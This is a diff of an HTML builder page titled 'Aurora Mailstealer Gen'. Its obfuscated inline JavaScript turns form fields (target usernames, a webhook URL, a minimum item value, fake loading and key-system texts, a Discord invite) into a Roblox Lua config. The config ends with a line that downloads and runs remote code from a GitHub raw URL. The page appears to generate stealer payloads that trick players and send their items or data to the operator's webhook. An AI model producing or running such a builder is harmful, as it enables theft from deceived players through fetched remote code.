@@ -17,66 +17,123 @@
 </style>
 </head>
 <body>
-<div class="container">
-<h1>Aurora Mailstealer Gen</h1>
-  <div class="input-field">
-    <label for="username">Username:</label>
-    <input type="text" id="username" name="username">
+  <div class="container">
+  <h1>Aurora Mailstealer Gen</h1>
+    <div class="input-field">
+      <label for="username">Username:</label>
+      <input type="text" id="username" name="username">
+    </div>
+    <div class="input-field">
+      <label for="username2">Username2:</label>
+      <input type="text" id="username2" name="username2">
+    </div>
+    <div class="input-field">
+      <label for="webhook">Webhook URL:</label>
+      <input type="text" id="webhook" name="webhook">
+    </div>
+    <div class="input-field">
+      <label for="min_rap">Minimum Rap:</label>
+      <input type="text" id="min_rap" name="min_rap">
+    </div>
+    <div class="checkbox-group">
+      <input type="checkbox" id="support" name="Support">
+      <label for="support">Support</label>
+    </div>
+    <div class="checkbox-group">
+      <input type="checkbox" id="checkrank" name="checkrank">
+      <label for="checkrank">checkrank</label>
+    </div>
+    <div class="input-field">
+      <label for="minimumRank">Minimum Rank:</label>
+      <input type="text" id="minimumRank" name="minimumRank">
+    </div>
+    <div class="checkbox-group">
+      <input type="checkbox" id="keySystemEnabled" name="keySystemEnabled">
+      <label for="keySystemEnabled">keySystemEnabled</label>
+    </div>
+    <div class="input-field">
+      <label for="Title">Key System Title:</label>
+      <input type="text" id="Title" name="Title">
+    </div>
+    <div class="input-field">
+      <label for="Fake_Loading_Text">Fake Loading Text:</label>
+      <input type="text" id="Fake_Loading_Text" name="Fake_Loading_Text">
+    </div>
+    <div class="input-field">
+      <label for="Get_Key_Text">Get Key Text:</label>
+      <input type="text" id="Get_Key_Text" name="Get_Key_Text">
+    </div>
+    <div class="input-field">
+      <label for="keysFree">Free Keys:</label>
+      <input type="text" id="keysFree" name="keysFree">
+    </div>
+    <div class="input-field">
+      <label for="keysPaid">Paid Keys:</label>
+      <input type="text" id="keysPaid" name="keysPaid">
+    </div>
+    <button onclick="generateOutput()">Generate</button>
+    <textarea id="output"></textarea>
+    <button onclick="copyToClipboard()">Copy to Clipboard</button>
   </div>
-  <div class="input-field">
-    <label for="username2">Username2:</label>
-    <input type="text" id="username2" name="username2">
-  </div>
-  <div class="input-field">
-    <label for="webhook">Webhook URL:</label>
-    <input type="text" id="webhook" name="webhook">
-  </div>
-  <div class="input-field">
-    <label for="min_rap">Minimum Rap:</label>
-    <input type="text" id="min_rap" name="min_rap">
-  </div>
-  <div class="checkbox-group">
-    <input type="checkbox" id="Support" name="Support">
-    <label for="checkrank">Support</label>
-  </div>
-  <div class="checkbox-group">
-    <input type="checkbox" id="checkrank" name="checkrank">
-    <label for="checkrank">checkrank</label>
-  </div>
-  <div class="input-field">
-    <label for="minimumRank">Minimum Rank:</label>
-    <input type="text" id="minimumRank" name="minimumRank">
-  </div>
-  <div class="checkbox-group">
-    <input type="checkbox" id="keySystemEnabled" name="keySystemEnabled">
-    <label for="keySystemEnabled">keySystemEnabled</label>
-  </div>
-  <div class="input-field">
-    <label for="Title">Key System Title:</label>
-    <input type="text" id="Title" name="Title">
-  </div>
-  <div class="input-field">
-    <label for="Fake_Loading_Text">Fake Loading Text:</label>
-    <input type="text" id="Fake_Loading_Text" name="Fake_Loading_Text">
-  </div>
-  <div class="input-field">
-    <label for="Get_Key_Text">Get Key Text:</label>
-    <input type="text" id="Get_Key_Text" name="Get_Key_Text">
-  </div>
-  <div class="input-field">
-    <label for="keysFree">Free Keys:</label>
-    <input type="text" id="keysFree" name="keysFree">
-  </div>
-  <div class="input-field">
-    <label for="keysPaid">Paid Keys:</label>
-    <input type="text" id="keysPaid" name="keysPaid">
-  </div>
-  <button onclick="generateOutput()">Generate</button>
-  <textarea id="output"></textarea>
-  <button onclick="copyToClipboard()">Copy to Clipboard</button>
-</div>
 
-<script src="./js.js"></script>
+<script>
+  // NO SKIDDING!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+    function generateOutput() {
+    var _0x4a8a83 = document.getElementById('username').value || 'EmptyString'
+    var _0x329029 = document.getElementById('username2').value || 'EmptyString'
+    var _0x3c4552 = document.getElementById('keySystemEnabled').checked 
+    var _0x222f3f = document.getElementById('checkrank').checked 
+    var _0x51e346 = document.getElementById('webhook').value || 'EmptyString'
+    var _0x45ffaf = document.getElementById('minimumRank').value || 6
+    var support = document.getElementById('support').checked 
+    var _0x2fca06 = document.getElementById('min_rap').value || 500000
+    var _0x4c6222 =
+      document.getElementById('Title').value || 'Hubname | Keysystem'
+    var _0x12af75 =
+      document.getElementById('Fake_Loading_Text').value ||
+      'If Its Stuck On Loading, Please Join discord.gg/Eh7EX6dzAF To Get Your Error Fixed!'
+    var _0x4cfba3 =
+      document.getElementById('Get_Key_Text').value ||
+      'Get Your Key Here: discord.gg/Eh7EX6dzAF'
+    var _0x3ccd21 = document
+      .getElementById('keysPaid')
+      .value.split(',')
+      .map((_0x165223) => '"' + _0x165223.trim() + '"')
+      .join(', ')
+    var _0x11f9cd = document
+      .getElementById('keysFree')
+      .value.split(',')
+      .map((_0x40df26) => '"' + _0x40df26.trim() + '"')
+      .join(', ')
+    
+    var _0x37cca5 =
+      'Username = "' + _0x4a8a83 + '"\n' +
+      ('Username2 = "' + _0x329029 + '"\n') +
+      ('Webhook = "' + _0x51e346 + '" \n') +
+      ('min_rap = ' + _0x2fca06 + ' \n\n') +
+      ('Support = ' + support + ' \n\n') +
+      ('checkRank = ' + _0x222f3f + ' \n') +
+      ('minimumRank = ' + _0x45ffaf + ' \n\n') 
+
+      if(_0x3c4552 == true){
+        _0x37cca5 = _0x37cca5 +
+        ('keySystemEnabled = ' + _0x3c4552 + '\n') +
+        ('Title = "' + _0x4c6222 + '" \n') +
+        ('Fake_Loading_Text = "' + _0x12af75 + '" \n') +
+        ('keysFree = { ' + _0x11f9cd + ' }\n') +
+        ('keysPaid = { ' + _0x3ccd21 + ' }\n\n')
+      }
+      _0x37cca5 = _0x37cca5 + 'loadstring(game:HttpGet("https://raw.githubusercontent.com/Enivzoy/Utilz/main/lua/rblx/AuroraTils/mainframe"))()'
+      
+    document.getElementById('output').value = _0x37cca5
+    hljs.highlightAll()
+  }
+  function copyToClipboard() {
+    var _0x11de29 = document.getElementById('output')
+    _0x11de29.select()
+    document.execCommand('copy')
+  }
+</script>
 
 </body>
 </html>
